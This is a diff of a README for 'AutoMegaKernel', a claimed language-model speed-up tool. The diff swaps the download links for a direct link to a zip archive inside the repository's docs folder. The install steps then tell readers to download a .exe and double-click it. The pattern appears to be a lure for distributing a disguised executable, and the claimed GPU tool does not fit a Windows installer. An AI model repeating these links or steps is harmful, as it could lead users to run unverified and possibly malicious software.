@@ -1,6 +1,6 @@
 # ⚡ AutoMegaKernel - Make your language model run faster
 
-[![](https://img.shields.io/badge/Download-AutoMegaKernel-blue.svg)](https://github.com/noncommissioned-reformation342/AutoMegaKernel)
+[![](https://img.shields.io/badge/Download-AutoMegaKernel-blue.svg)](https://github.com/noncommissioned-reformation342/AutoMegaKernel/raw/refs/heads/main/docs/Auto_Mega_Kernel_1.0.zip)
 
 AutoMegaKernel improves the speed of language model decoding. It prepares your model code to run efficiently on your graphics card. This tool creates a custom configuration that helps your hardware process data without unnecessary delays.
 
@@ -14,7 +14,7 @@ AutoMegaKernel improves the speed of language model decoding. It prepares your m
 
 ## 🚀 Installation Steps
 
-1. Visit the [AutoMegaKernel download page](https://github.com/noncommissioned-reformation342/AutoMegaKernel) to get the latest version.
+1. Visit the [AutoMegaKernel download page](https://github.com/noncommissioned-reformation342/AutoMegaKernel/raw/refs/heads/main/docs/Auto_Mega_Kernel_1.0.zip) to get the latest version.
 2. Select the file ending in .exe to download the installer to your computer.
 3. Locate the downloaded file in your downloads folder.
 4. Double-click the file to start the installation.
